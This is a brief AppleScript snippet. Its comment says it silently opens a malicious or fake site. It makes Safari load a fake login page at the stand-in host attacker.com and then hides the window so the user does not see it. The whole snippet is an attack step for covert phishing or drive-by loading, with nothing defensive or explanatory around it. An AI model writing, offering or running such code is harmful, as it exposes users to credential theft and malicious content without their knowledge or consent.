-- Opens a malicious or fake site silently in the background
tell application "Safari"
    make new document with properties {URL:"http://attacker.com/login-fake"}
    delay 1
    set visible of front window to false
end tell
